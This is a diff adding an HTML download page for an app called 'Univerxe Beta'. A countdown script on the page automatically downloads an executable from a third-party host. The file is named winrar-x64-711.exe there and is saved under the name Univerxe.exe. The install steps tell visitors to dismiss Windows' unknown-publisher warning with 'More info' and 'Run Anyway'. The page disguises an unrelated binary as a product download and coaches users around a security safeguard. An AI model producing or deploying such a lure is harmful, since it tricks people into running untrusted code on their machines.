@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Downloading Univerxe..!</title>
+  <link rel="shortcut icon" href="favicon.ico">
+  <link rel="stylesheet" href="./style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+
+  <!-- ✅ Import Montserrat from Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    /* ✅ Apply Montserrat globally */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Montserrat', sans-serif;
+      background-image: url('https://assetstorev1-prd-cdn.unity3d.com/package-screenshot/05c006b0-3787-402f-af2d-4be1f26b0cc7_scaled.jpg');
+      background-size: cover;
+      background-position: center center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      color: #fff;
+      position: relative;
+      z-index: 0;
+    }
+
+    /* Black overlay to fade the background */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: -1;
+    }
+
+    #countdown {
+      font-size: 1.5em;
+      text-align: center;
+      margin: 30px 0;
+      color: #fff;
+    }
+
+    h2, h3.caption.gray, .team-member h4, .team-member p, #timer {
+      
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+    }
+
+    h3.caption.gray a {
+      color: #f0f0f0;
+      text-decoration: underline;
+    }
+
+    .container {
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 20px;
+      border-radius: 10px;
+    }
+
+    img.img-responsive {
+      max-width: 100%;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Our team Section -->
+<section id="team" class="team content-section">
+  <div class="container">
+    <div class="row text-center">
+      <div class="col-md-12">
+        <h2>Downloading Univerxe..!</h2>
+        <h3 class="caption gray">
+          Your download has started.
+          <a href="https://files02.tchspt.com/down/winrar-x64-711.exe" download>
+            Click here</a> if the download does not begin automatically.
+        </h3>
+      </div>
+    </div>
+
+    <!-- Countdown Timer -->
+    <div id="countdown">
+      Downloading in <span id="timer">3</span>...
+    </div>
+
+    <div class="row">
+<h3 class="caption gray">
+          STEPS TO INSTALL:
+        </h3>
+      <div class="col-md-4">
+        <div class="team-member">
+          <figure>
+            <img src="https://i.ibb.co/cK4XnfZL/1.png" alt="" class="img-responsive">
+            <figcaption>
+              <p>Open the Univerxe Beta file from your Browser.</p>
+            </figcaption>
+          </figure>
+          <h4>OPEN FILE-></h4>
+          <p>Open the Downloaded Univerxe Beta file from the Browser.</p>
+        </div>
+      </div>
+
+      <div class="col-md-4">
+        <div class="team-member">
+          <figure>
+            <img src="https://i.ibb.co/35bKfDkj/2.png" alt="" class="img-responsive">
+            <figcaption>
+              <p>As we are on the Univerxe Beta version, Windows may show an unknown publisher warning. Click More info-&gt;</p>
+            </figcaption>
+          </figure>
+          <h4>CLICK MORE INFO-></h4>
+          <p>As we are on the Univerxe Beta version, Windows may show an unknown publisher warning.</p>
+        </div>
+      </div>
+
+      <div class="col-md-4">
+        <div class="team-member">
+          <figure>
+            <img src="https://i.ibb.co/YB3Sr6RJ/33.png" alt="" class="img-responsive">
+            <figcaption>
+              <p>Click Run Anyway to Continue Installing Univerxe Beta.</p>
+            </figcaption>
+          </figure>
+          <h4>CLICK RUN ANYWAY-></h4>
+          <p>Click Run Anyway to Continue Installing Univerxe Beta.</p>
+        </div>
+      </div>
+
+    </div><!-- /.row -->
+  </div><!-- /.container -->
+</section>
+
+<!-- Countdown Script -->
+<script>
+  let countdown = 3;
+  const timerElement = document.getElementById("timer");
+
+  const interval = setInterval(() => {
+    countdown--;
+    timerElement.textContent = countdown;
+
+    if (countdown === 0) {
+      clearInterval(interval);
+
+      // Trigger file download
+      const link = document.createElement("a");
+      link.href = "https://files02.tchspt.com/down/winrar-x64-711.exe";
+      link.download = "Univerxe.exe";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+
+      document.getElementById("countdown").textContent = "Download started!";
+    }
+  }, 1000);
+</script>
+
+</body>
+</html>
